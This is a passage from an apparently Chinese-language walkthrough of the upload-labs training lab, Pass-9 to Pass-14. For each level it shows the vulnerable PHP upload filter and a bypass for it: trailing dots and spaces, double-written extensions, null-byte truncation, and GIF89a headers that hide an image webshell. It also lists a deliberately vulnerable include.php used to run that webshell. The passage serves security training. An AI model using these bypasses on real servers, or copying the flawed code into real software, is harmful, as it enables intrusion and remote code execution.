class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解法-7"><a href="#解法-7" class="headerlink" title="解法"></a>解法</h2><p>这次发现把前面能用的几种方法全部堵死了。但是可以发现：php文件会先删除.，再删除空格。所以可以修改后缀为<code>webshell.php. .</code>来绕过，经过处理之后变成<code>webshell.php.</code>，这样就可以上传了。</p><h1 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>)) &#123;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解法-8"><a href="#解法-8" class="headerlink" title="解法"></a>解法</h2><p>这次会对违规的部分直接移除，导致上传的php后缀文件后缀缺失。这种情况下，这种移除的情况都可以使用双写绕过，即修改为<code>webshell.pphphp</code>上传，这样上传后的文件后缀就会修改为正常的<code>.php</code>，可以正常连接。</p><h1 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解法-9"><a href="#解法-9" class="headerlink" title="解法"></a>解法</h2><p>这次是使用白名单过滤，而且</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure><p>所以可以使用%00的截断绕过，即：<br>先上传<code>webshell.jpg</code>然后使用bp抓包，将<code>save_path</code>参数修改为以下即可上传：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673689610306-ac532bbc-e2d6-4061-b1f3-377b4bb35972.png" alt="image.png"></p><h2 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h2><p>php版本要小于<code>5.3.4</code> 修改<code>php.ini</code>的<code>magic_quotes_gpc</code>为OFF状态</p><h1 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解法-10"><a href="#解法-10" class="headerlink" title="解法"></a>解法</h2><p>与上一关相比，这次的<code>save_path</code>参数是在<code>POST</code>内的，但是在<code>POST</code>中加<code>%00</code>参数不行，因为会被解析为字符串，但肯定还是使用<code>00</code>来截断，因此这道题需要修改<code>hex</code>。<br>先上传<code>webshell.jpg</code>文件，修改保存路径，并在末尾添加一个字符<code>a</code>。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673771713001-3916d4ff-baf3-42db-b504-02a210287690.png" alt="image.png"><br>然后打开Burpsuite的<code>Hex</code>模式，找到对应<code>a</code>字符的hex值修改为00<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673771889576-21235d91-3988-49a5-a490-67217b152112.png" alt="image.png"><br>也可以raw模式下选中a修改hex为00<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673771934277-9f2bddb4-fe97-41cf-90ce-64de637342fa.png" alt="image.png"></p><h1 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="title function_ invoke__">getReailFileType</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解法-11"><a href="#解法-11" class="headerlink" title="解法"></a>解法</h2><p><code>getReailFileType()</code>函数获取文件的最开始两个字节，来判断文件类型，因此可以使用图片文件欺骗来进行攻击。不同类型文件文件头标准编码是不同的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">JPEG</span> (jpg)，文件头：FF D8 FF</span><br><span class="line"><span class="title function_ invoke__">PNG</span> (png)，文件头：<span class="number">89</span> <span class="number">50</span> <span class="number">4</span>E <span class="number">47</span>     【参考：png文件头详解】<span class="number">89</span> <span class="number">50</span> <span class="number">4</span>e <span class="number">47</span> <span class="number">0</span>d <span class="number">0</span>a <span class="number">1</span>a <span class="number">0</span>a</span><br><span class="line"><span class="title function_ invoke__">GIF</span> (gif)，文件头：<span class="number">47</span> <span class="number">49</span> <span class="number">46</span> <span class="number">38</span> <span class="comment">//常用47 49 46 38 39 61 标识GIF89a</span></span><br><span class="line">Windows <span class="title function_ invoke__">Bitmap</span> (bmp)，文件头：<span class="number">42</span> <span class="number">4</span>D [参考：bmp文件格式详解]<span class="number">42</span> <span class="number">4</span>D <span class="number">36</span> <span class="number">0</span>C <span class="number">30</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">36</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">28</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">56</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">18</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">python反编译文件pyc的头：<span class="number">03</span> F3 <span class="number">0</span>D <span class="number">0</span>A  （实验吧，py的交易会用到）</span><br><span class="line">pyd的文件头：<span class="number">4</span>D <span class="number">5</span>A <span class="number">90</span> <span class="number">00</span></span><br><span class="line">ZIP <span class="title function_ invoke__">Archive</span> (zip)，文件头：<span class="number">50</span> <span class="number">4</span>B <span class="number">03</span> <span class="number">04</span> ascii码部分是PK，可以直接根据PK判断是zip文件，也有可能是doc文件</span><br><span class="line">rar文件: <span class="number">52</span> <span class="number">61</span> <span class="number">72</span> <span class="number">21</span></span><br><span class="line"><span class="number">7</span>z文件头：<span class="number">37</span> <span class="number">7</span>A BC AF <span class="number">27</span> <span class="number">1</span>C（实验吧，有趣的文件用到了）</span><br><span class="line">MS Word/<span class="title function_ invoke__">Excel</span> (xls.<span class="keyword">or</span>.doc)，文件头：D0CF11E0</span><br><span class="line"><span class="title function_ invoke__">CAD</span> (dwg)，文件头：<span class="number">41433130</span></span><br><span class="line">Adobe <span class="title function_ invoke__">Photoshop</span> (psd)，文件头：<span class="number">38425053</span></span><br><span class="line">Rich Text <span class="title function_ invoke__">Format</span> (rtf)，文件头：<span class="number">7</span>B5C727466</span><br><span class="line"><span class="title function_ invoke__">XML</span> (xml)，文件头：<span class="number">3</span>C3F786D6C</span><br><span class="line"><span class="title function_ invoke__">HTML</span> (html)，文件头：<span class="number">68746</span>D6C3E</span><br><span class="line">Email [thorough only] (eml)，文件头：<span class="number">44656</span>C69766572792D646174653A</span><br><span class="line">Outlook <span class="title function_ invoke__">Express</span> (dbx)，文件头：CFAD12FEC5FD746F</span><br><span class="line"><span class="title function_ invoke__">Outlook</span> (pst)，文件头：<span class="number">2142444</span>E</span><br><span class="line">MS <span class="title function_ invoke__">Access</span> (mdb)，文件头：<span class="number">5374616E64617264204</span>A</span><br><span class="line"><span class="title function_ invoke__">WordPerfect</span> (wpd)，文件头：FF575043</span><br><span class="line"><span class="title function_ invoke__">Postscript</span> (eps.<span class="keyword">or</span>.ps)，文件头：<span class="number">252150532</span>D41646F6265</span><br><span class="line">Adobe <span class="title function_ invoke__">Acrobat</span> (pdf)，文件头：<span class="number">255044462</span>D312E</span><br><span class="line"><span class="title function_ invoke__">Quicken</span> (qdf)，文件头：AC9EBD8F</span><br><span class="line">Windows <span class="title function_ invoke__">Password</span> (pwl)，文件头：E3828596</span><br><span class="line">RAR <span class="title function_ invoke__">Archive</span> (rar)，文件头：<span class="number">52617221</span></span><br><span class="line"><span class="title function_ invoke__">Wave</span> (wav)，文件头：<span class="number">57415645</span></span><br><span class="line"><span class="title function_ invoke__">AVI</span> (avi)，文件头：<span class="number">41564920</span></span><br><span class="line">Real <span class="title function_ invoke__">Audio</span> (ram)，文件头：<span class="number">2E7261</span>FD</span><br><span class="line">Real <span class="title function_ invoke__">Media</span> (rm)，文件头：<span class="number">2E524</span>D46</span><br><span class="line"><span class="title function_ invoke__">MPEG</span> (mpg)，文件头：<span class="number">000001</span>BA</span><br><span class="line"><span class="title function_ invoke__">MPEG</span> (mpg)，文件头：<span class="number">000001</span>B3</span><br><span class="line"><span class="title function_ invoke__">Quicktime</span> (mov)，文件头：<span class="number">6</span>D6F6F76</span><br><span class="line">Windows <span class="title function_ invoke__">Media</span> (asf)，文件头：<span class="number">3026</span>B2758E66CF11</span><br><span class="line"><span class="title function_ invoke__">MIDI</span> (mid)，文件头：<span class="number">4</span>D546864</span><br></pre></td></tr></table></figure><p>因此，可以在文件前添加<code>GIF89a</code>来迷惑文件检测<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673778087346-92bc1307-babe-4ad4-b1c5-85473c31f677.png" alt="image.png"><br>添加之后上传，上传成功，但是这时候文件后缀是<code>.gif</code>格式，这道题要求的是上传图片马，因此到这里即可，我们可以测试一下是否可以使用。</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>我们在本地创建一个<code>include.php</code>文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(__file__);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后保存到<code>upload-labs</code>的目录下即可（与upload文件夹同级），保存之后，用antsword连接<br><code>http://你的ip/upload-labs/include.php?file=upload/文件名称</code>，如果可以连接则说明图片马上传成功。（注意，这道题上传的图片马会改名字，修改的名字在response传回时会显示）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673782519464-3fcd10b2-4cc6-4d71-9e53-2326825163ca.png" alt="image.png"></p><h1 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">image_type_to_extension</span>(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$types</span>,<span 